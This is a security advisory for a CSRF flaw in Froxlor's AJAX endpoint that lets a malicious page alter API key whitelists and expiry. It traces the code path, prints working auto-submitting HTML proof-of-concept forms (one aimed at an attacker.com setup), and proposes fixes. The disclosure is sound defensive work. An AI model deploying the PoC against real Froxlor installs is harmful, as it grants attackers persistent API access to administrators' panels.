# [M] Froxlor has CSRF Vulnerability in AJAX Endpoint — Missing Cross-Site Request Forgery Protection

## Summary
Severity: Medium
Advisory: GHSA-xpr4-8vp6-c87j
CVE: CVE-2026-55593
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-xpr4-8vp6-c87j
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.8

## Details
## Summary

The Froxlor AJAX endpoint (`lib/ajax.php`) is missing Cross-Site Request Forgery (CSRF) protection. While the main application (`lib/init.php`) enforces CSRF token validation on all state-changing HTTP requests (POST/PUT/PATCH/DELETE), the standalone `lib/ajax.php` endpoint bypasses this mechanism entirely, validating only the user's session. An attacker can craft a malicious webpage that, when visited by an authenticated Froxlor administrator, silently modifies API key properties (e.g., adding the attacker's IP to the `allowed_from` whitelist or extending the `valid_until` expiration).

---

## Affected Component

- **File:** `lib/ajax.php` — the AJAX endpoint entry point (bypasses `lib/init.php`)
- **File:** `lib/Froxlor/Ajax/Ajax.php:66-92` — `Ajax::handle()` (no CSRF check before routing)
- **File:** `lib/Froxlor/Ajax/Ajax.php:257-315` — `Ajax::editApiKey()` (writes to database without CSRF check)
- **Version:** Froxlor 2.3.7 (likely all prior 2.x versions)

---

## Complete Call Chain: Entry Point → Vulnerable Code

### Step 1: Entry Point — `lib/ajax.php` (standalone bootstrap, bypasses `lib/init.php`)

```php
// lib/ajax.php:26-47
namespace Froxlor;

use Froxlor\Ajax\Ajax;

require_once dirname(__DIR__) . '/vendor/autoload.php';
require_once dirname(__DIR__) . '/lib/userdata.inc.php';
require_once dirname(__DIR__) . '/lib/functions.php';
require_once dirname(__DIR__) . '/lib/tables.inc.php';

// CRITICAL: This file does NOT include lib/init.php
// Therefore: NO CSRF token is checked before processing the request
echo (new Ajax)->handle();
```

**Contrast with normal flow:** All admin/customer pages (e.g., `admin_customers.php`, `customer_domains.php`) do:
```php
const AREA = 'admin';
require __DIR__ . '/lib/init.php';  // <-- This enforces CSRF at lines 363-369
```

### Step 2: Ajax Constructor — Session Created, No CSRF Check

```php
// lib/Froxlor/Ajax/Ajax.php:54-61
public function __construct()
{
    $this->action = Request::any('action');  // <-- User-controlled from GET/POST
    $this->theme = Request::any('theme', 'Froxlor');

    UI::sendHeaders();        // Starts session, sets security headers
    UI::sendSslHeaders();     // HSTS headers
    // MISSING: CSRF token validation on POST/PUT/PATCH/DELETE
}
```

### Step 3: Ajax::handle() — Session Validation Only, Routes to Action

```php
// lib/Froxlor/Ajax/Ajax.php:66-92
public function handle()
{
    $this->userinfo = $this->getValidatedSession();  // Only checks: isset($_SESSION['userinfo'])
    // MISSING: CSRF token validation before routing
    // Comparison: init.php lines 363-369 WOULD check here:
    //   if (in_array($_SERVER['REQUEST_METHOD'], ['POST', 'PUT', 'PATCH', 'DELETE'])) {
    //       $current_token = Request::post('csrf_token', ...);
    //       if ($current_token != CurrentUser::getField('csrf_token')) { ERROR; }
    //   }

    switch ($this->action) {
        case 'editapikey':
            return $this->editApiKey();   // <-- State-changing operation, no CSRF guard
        case 'updatetablelisting':
            return $this->updateTablelisting();  // <-- Also POST, also no CSRF
        // ... other cases
    }
}
```

### Step 4: getValidatedSession() — Only Checks Session Exists

```php
// lib/Froxlor/Ajax/Ajax.php:97-103
private function getValidatedSession(): array
{
    if (CurrentUser::hasSession() == false) {
        throw new Exception("No valid session");
    }
    return CurrentUser::getData();
    // hasSession() implementation (CurrentUser.php:47-50):
    //   return !empty($_SESSION) && !empty($_SESSION['userinfo']);
    // This ONLY verifies a session exists.
    // It does NOT verify the request origin or CSRF token.
}
```

### Step 5: editApiKey() — Database Mutation Without Origin Validation

```php
// lib/Froxlor/Ajax/Ajax.php:257-315
private function editApiKey()
{
    // All three parameters come from attacker-controlled POST body:
    $keyid = Request::post('id', 0);                    // Source: $_POST['id']
    $allowed_from = Request::post('allowed_from', "");  // Source: $_POST['allowed_from']
    $valid_until = Request::post('valid_until', "");    // Source: $_POST['valid_until']

    // ... IP format validation (not security-relevant for CSRF) ...

    // SINK: Direct database mutation
    $upd_stmt = Database::prepare("
        UPDATE `api_keys` SET
        `valid_until` = :vu, `allowed_from` = :af
        WHERE `id` = :keyid AND `adminid` = :aid AND `customerid` = :cid
    ");
    Database::pexecute($upd_stmt, [
        'keyid' => $keyid,
        'af' => $allowed_from,     // Attacker's IP written here
        'vu' => $valid_until_db,   // -1 = never expires
        'aid' => $this->userinfo['adminid'],
        'cid' => $cid
    ]);
    return $this->jsonResponse(['allowed_from' => $allowed_from, 'valid_until' => $valid_until]);
}
```

### Step 6: Evidence from Legitimate Frontend — No CSRF Token Sent Even in Normal Usage

```javascript
// templates/Froxlor/assets/js/jquery/apikeys.js:9-17
// Even the legitimate frontend does NOT send a csrf_token:
$.ajax({
    url: "lib/ajax.php?action=editapikey",
    type: "POST",
    dataType: "json",
    data: {
        id: akid,
        allowed_from: _this.val(),
        valid_until: $('div[data-entry="' + akid + '"] #valid_until').val()
        // NOTE: No csrf_token field here — the backend doesn't require it
    },
    // ...
});
```

This confirms: the backend does not validate CSRF tokens, so the frontend code does not bother sending one.

---

## CSRF Protection Gap: Side-by-Side Comparison

| Aspect | `lib/init.php` (Normal Pages) | `lib/ajax.php` (AJAX Endpoint) |
|--------|------------------------------|-------------------------------|
| **Includes init.php** | Yes (all admin_*.php, customer_*.php) | **No** — standalone bootstrap |
| **Session validation** | ✅ `CurrentUser::hasSession()` | ✅ `CurrentUser::hasSession()` |
| **CSRF token generation** | ✅ `Froxlor::genSessionId(20)` | ❌ Not generated |
| **CSRF token check (POST/PUT/PATCH/DELETE)** | ✅ Lines 363-369 | **❌ Missing entirely** |
| **Rate limiting** | ✅ `RateLimiter::run()` | ❌ Not called |
| **Area enforcement** | ✅ Admin/Customer area check | ❌ Not enforced |

---

## Vulnerability Verification

### Attack Path (Complete)

```
[Attacker] Hosts malicious HTML page at https://attacker.com/csrf.html

    <form id="csrf" action="https://froxlor.example.com/lib/ajax.php?action=editapikey"
          method="POST">
      <input type="hidden" name="id" value="1">
      <input type="hidden" name="allowed_from" value="ATTACKER_IP">
      <input type="hidden" name="valid_until" value="-1">
    </form>
    <script>document.getElementById('csrf').submit();</script>

        │
        ▼
[Victim] Froxlor administrator browses to https://attacker.com/csrf.html
  - Victim has an active session at https://froxlor.example.com
  - Session cookie: PHPSESSID=<valid>, SameSite=Lax
        │
        ▼
[Browser] Auto-submits POST to https://froxlor.example.com/lib/ajax.php?action=editapikey
  - Cookie behavior depends on SameSite policy (see below)
        │
        ▼
[Server: lib/ajax.php]
  → require userdata.inc.php, functions.php, tables.inc.php
  → (new Ajax)->handle()
        │
        ▼
[Server: Ajax::__construct()]  (Ajax.php:54-61)
  → $this->action = 'editapikey'  (from GET query string)
  → UI::sendHeaders() → session_start()
  → NO CSRF CHECK
        │
        ▼
[Server: Ajax::handle()]  (Ajax.php:66-68)
  → getValidatedSession() → CurrentUser::hasSession() → TRUE
    (session cookie was sent with request)
  → NO CSRF CHECK before routing
        │
        ▼
[Server: Ajax::editApiKey()]  (Ajax.php:257-315)
  → $keyid = 1 (from POST)
  → $allowed_from = 'ATTACKER_IP' (from POST)
  → $valid_until_db = -1 (from POST, parsed)
  → UPDATE api_keys SET allowed_from='ATTACKER_IP', valid_until=-1 WHERE id=1
        │
        ▼
[Impact] API key #1 now allows connections from ATTACKER_IP, never expires
```

### SameSite=Lax Analysis

Froxlor sets session cookie with `SameSite=Lax` (UI.php:124):

```php
// lib/Froxlor/UI/Panel/UI.php:118-125
session_set_cookie_params([
    'path' => '/',
    'domain' => self::getCookieHost(),
    'secure' => self::requestIsHttps(),    // FALSE on HTTP deployments
    'httponly' => true,
    'samesite' => 'Lax'
]);
session_start();
```

**Why SameSite=Lax is NOT a complete mitigation:**

1. **HTTP deployments:** When `requestIsHttps()` returns false (plain HTTP), the `secure` flag is false. Many browsers (particularly older Safari and Firefox) require `Secure` for strict SameSite enforcement. Froxlor's own documentation supports HTTP deployment for internal networks, making this a realistic scenario.

2. **Safari browser:** Safari's SameSite implementation has known inconsistencies. Safari 13-15 on iOS/macOS may not enforce SameSite=Lax on POST requests as strictly as Chrome.

3. **Same-site subdomain attacks:** If an attacker compromises a subdomain of the same registrable domain (e.g., via DNS rebinding or subdomain takeover), SameSite=Lax provides zero protection — cookies are sent freely.

4. **Defense-in-depth failure:** CSRF tokens are the primary, proven defense against CSRF. SameSite cookies are a secondary defense. The absence of the primary defense leaves the application vulnerable whenever the secondary defense fails (browser bugs, HTTP deployments, subdomain attacks).

### Confirmed Vulnerable Actions in Ajax::handle()

All POST-based actions in the switch statement lack CSRF protection:

| Action | Method | State Change | Risk |
|--------|--------|-------------|------|
| `editapikey` | POST | UPDATE `api_keys` SET allowed_from, valid_until | **HIGH** |
| `updatetablelisting` | POST | UPDATE `panel_usercolumns` (user preferences) | Low |
| `getConfigDetails` | POST | Read-only (config parsing) | None |

---

## Impact

- **Confidentiality:** None — the attacker cannot directly read data through this CSRF vector
- **Integrity:** Medium — API key properties (`allowed_from`, `valid_until`) can be modified to add the attacker's IP to the whitelist and extend validity indefinitely. This is a stepping stone to API access (combined with another attack to obtain the API secret, such as VULN-20260526-001 plaintext secret storage).
- **Availability:** Low — the attacker could set `valid_until` to a past timestamp, disabling the API key

**Worst-case scenario:** An administrator-level API key has its `allowed_from` expanded to include the attacker's IP and its `valid_until` set to `-1` (never expires). If the attacker later obtains the plaintext API secret (e.g., via database backup exposure — see VULN-20260526-001), they gain persistent, unauthorized API access with administrator privileges.

---

## Proof of Concept

### PoC HTML File

```html
<!-- csrf_poc.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC - Froxlor AJAX Endpoint</title>
</head>
<body>
    <h1>Cross-Site Request Forgery Proof of Concept</h1>
    <p>Target: Froxlor AJAX endpoint (lib/ajax.php?action=editapikey)</p>
    <p>If you see this page, the form has auto-submitted.</p>

    <!-- This form auto-submits to modify API key properties -->
    <form id="csrf-form"
          action="http://froxlor.example.com/lib/ajax.php?action=editapikey"
          method="POST">
        <input type="hidden" name="id" value="1">
        <input type="hidden" name="allowed_from" value="10.99.99.99">
        <input type="hidden" name="valid_until" value="">
        <!-- empty valid_until = -1 (never expires) -->
    </form>

    <script>
        // Auto-submit on page load
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('csrf-form').submit();
        });
    </script>
</body>
</html>
```

### Reproduction Steps

1. **Setup:**
   - Deploy Froxlor 2.3.7 on a test server (e.g., `http://192.168.1.100/`)
   - Create an administrator account and log in
   - Create at least one API key (Settings → API Keys)

2. **Prepare PoC:**
   - Host the PoC HTML file on a different origin (e.g., `http://attacker.local/csrf_poc.html`)
   - Note the Froxlor server is on `http://` (not HTTPS, common for internal deployments)

3. **Execute:**
   - Ensure the Froxlor administrator has an active session
   - Open the PoC HTML file in the **same browser** (different tab)
   - The form auto-submits

4. **Verify:**
   - Check the API key in the Froxlor admin panel
   - The `allowed_from` field now contains `10.99.99.99`
   - The `valid_until` field shows no expiration
   - Or verify directly: `SELECT id, allowed_from, valid_until FROM api_keys WHERE id=1;`

### Expected Result

Before attack:
```
id | allowed_from | valid_until
1  |              | 1735689600
```

After attack:
```
id | allowed_from   | valid_until
1  | 10.99.99.99    | -1
```

---

## Root Cause

The `lib/ajax.php` endpoint was implemented as a completely standalone entry point that initializes its own minimal environment. It does not include `lib/init.php`, which provides centralized security controls (CSRF validation, rate limiting, area enforcement) for all standard admin and customer pages.

Architecturally, there are two security enforcement paths:
1. **Normal pages:** `admin_*.php` → `require lib/init.php` → CSRF check ✅
2. **AJAX endpoint:** `lib/ajax.php` → `new Ajax()->handle()` → CSRF check ❌

The `Ajax` class performs its own session validation (`getValidatedSession()`) but omits CSRF token verification entirely. The legitimate frontend JavaScript code (`apikeys.js`) also does not send a CSRF token because the backend does not require one.

---

## Fix Recommendation

### Option A (Recommended): Route AJAX Through init.php

Refactor `lib/ajax.php` to use the standard bootstrap, ensuring all security controls apply uniformly:

```php
// lib/ajax.php — Refactored
const AREA = 'ajax';
require __DIR__ . '/init.php';

use Froxlor\Ajax\Ajax;

try {
    echo (new Ajax)->handle();
} catch (Exception $e) {
    header("Content-Type: application/json");
    echo \Froxlor\Api\Response::jsonErrorResponse($e->getMessage(), 500);
}
```

**Pros:** All security controls (CSRF, rate limiting, session management, area enforcement) apply uniformly. No code duplication.
**Cons:** Requires frontend changes to include CSRF token in AJAX requests.

### Option B (Minimal): Add CSRF Check to Ajax Class

Add CSRF token validation directly in the `Ajax` class:

```diff
// lib/Froxlor/Ajax/Ajax.php

public function handle()
{
    $this->userinfo = $this->getValidatedSession();

+   // CSRF Protection — mirror init.php:363-369
+   if (in_array($_SERVER['REQUEST_METHOD'], ['POST', 'PUT', 'PATCH', 'DELETE'])) {
+       $token_from_request = Request::post('csrf_token',
+           $_SERVER['HTTP_X_CSRF_TOKEN'] ?? null);
+       $stored_token = $this->userinfo['csrf_token'] ?? '';
+       if (empty($token_from_request) || !hash_equals($stored_token, $token_from_request)) {
+           return $this->errorResponse('CSRF validation failed', 403);
+       }
+   }

    switch ($this->action) {
        // ... existing cases unchanged
    }
}
```

**Frontend changes required (for both options):**

```diff
// templates/Froxlor/assets/js/jquery/apikeys.js
$.ajax({
    url: "lib/ajax.php?action=editapikey",
    type: "POST",
    dataType: "json",
    data: {
        id: akid,
        allowed_from: _this.val(),
        valid_until: $('div[data-entry="' + akid + '"] #valid_until').val(),
+       csrf_token: $('meta[name="csrf-token"]').attr('content')
    },
    // ...
});
```

### CSRF Token Available in Twig Templates

The CSRF token is already available as a Twig global variable (`{{ csrf_token }}`) set in `init.php:361`. Templates can expose it via:

```html
<meta name="csrf-token" content="{{ csrf_token }}">
```

---

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-xpr4-8vp6-c87j
- https://github.com/froxlor/froxlor/commit/5f540fe361e7e13e8c5a32805b793a25e9e26a0e
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.8
